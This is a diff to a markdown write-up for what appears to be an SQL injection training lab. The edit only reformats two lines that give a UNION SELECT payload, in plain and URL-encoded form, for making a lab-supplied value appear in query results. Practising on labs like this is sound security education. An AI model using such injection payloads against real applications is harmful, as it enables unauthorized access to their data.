@@ -11,9 +11,9 @@ The lab will provide a random value that you need to make appear within the quer
 
 ## Payload
 
-Normal: ```' UNION SELECT NULL,'4Zcva0',NULL--```
+- Normal: ```' UNION SELECT NULL,'4Zcva0',NULL--```
 
-URL-Encoded: ```%27+UNION+SELECT+NULL,%274Zcva0%27,NULL--```
+- URL-Encoded: ```%27+UNION+SELECT+NULL,%274Zcva0%27,NULL--```
 
 ### Video Solution
 1. Manual: [Rana Khalil's Youtube video](https://youtu.be/SGBTC5D7DTs)
